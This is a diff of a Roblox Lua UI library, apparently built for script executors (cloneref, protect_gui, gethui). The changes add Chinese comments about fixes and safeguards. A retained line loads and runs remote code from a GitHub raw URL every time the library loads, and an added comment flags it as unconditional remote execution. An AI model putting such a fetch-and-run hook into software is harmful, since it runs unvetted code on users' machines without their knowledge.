@@ -2,15 +2,22 @@ repeat
 	task.wait()
 until game:IsLoaded()
 
+-- ============ 【修复1】library 状态必须最先声明 ============
+-- 原因：下面的 GiveSignal / safeCall 等函数会在闭包中捕获 library。
+-- Lua 的闭包是"定义时按词法作用域捕获"，如果 local library 声明在
+-- 这些函数之后，函数体内的 library 实际指向永远是 nil 的全局变量，
+-- 一旦调用 GiveSignal 就会直接报错 "attempt to index nil value"。
 local library = {}
 library.currentTab = nil
 library.flags = {}
 library._signals = {}
 
+-- ============ 安全增强：cloneref 多执行器兼容 ============
 local cloneref = cloneref or clonereference or function(instance)
 	return instance
 end
 
+-- ============ 安全增强：SafeParentUI 三级回退 ============
 local function SafeParentUI(instance, parent)
 	local success, _ = pcall(function()
 		instance.Parent = parent
@@ -24,6 +31,7 @@ local function SafeParentUI(instance, parent)
 	end
 end
 
+-- ============ 安全增强：protect_gui pcall 保护 ============
 local function ProtectUI(ui)
 	pcall(function()
 		local pg = protectgui or (syn and syn.protect_gui)
@@ -31,6 +39,7 @@ local function ProtectUI(ui)
 	end)
 end
 
+-- ============ 安全增强：信号管理系统 ============
 local function GiveSignal(connection)
 	if connection and (typeof(connection) == "RBXScriptConnection" or typeof(connection) == "RBXScriptSignal") then
 		table.insert(library._signals, connection)
@@ -46,6 +55,8 @@ local function safeCall(context, callback, ...)
 	end
 end
 
+-- 注意：这行会在库加载时无条件拉取并执行远程代码。
+-- 建议确认这是你自己可控的更新/遥测逻辑，且仓库访问权限受控。
 pcall(function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/Jilxi/123/refs/heads/main/1.lua"))()
 end)
@@ -181,6 +192,7 @@ local gethui = gethui or function()
 	return cloneref(game:GetService("CoreGui"))
 end
 
+-- ============ 安全增强：ModalElement 防穿透点击 ============
 local function CreateModal()
 	local modal = Instance.new("TextButton")
 	modal.BackgroundTransparency = 1
@@ -257,7 +269,6 @@ function library.new(library, name, theme)
 	Main.Size = UDim2.new(0, 572, 0, 353)
 	Main.ZIndex = 1
 	Main.Active = true
-	Main.Draggable = true
 
 	GiveSignal(services.UserInputService.InputEnded:Connect(function(input)
 		if input.KeyCode == Enum.KeyCode.RightShift then
@@ -375,6 +386,7 @@ function library.new(library, name, theme)
 
 	UIGradientTitle.Parent = ScriptTitle
 
+	-- ============ 【修复2】渐变动画损坏语法已修好 ============
 	local function titleRainbowAnimation()
 		local gradient = UIGradientTitle
 		local ts = services.TweenService
